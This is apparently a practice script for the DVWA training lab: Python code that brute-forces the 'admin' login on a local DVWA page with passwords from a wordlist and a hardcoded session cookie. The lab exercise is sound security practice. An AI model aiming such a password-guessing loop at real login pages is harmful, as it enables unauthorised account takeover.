import requests
cookie = {'security': 'medium','PHPSESSID':'jdl0o7bvnkfuvrris8kg87b3ff'}
fp = open("./dictionary.txt","r")

dictionary_list = [x.strip() for x in fp.readlines()]
for upw in dictionary_list:
	url = f'http://localhost/DVWA/vulnerabilities/brute/?username=admin&password={upw}&Login=Login#'

	
	response = requests.get(url=url,cookies=cookie)
	if "incorrect" not in response.text:
		print(f"[o] SUCCESS... {upw}")
		break
	else: 
		print(f'[x] Failed... {upw}')
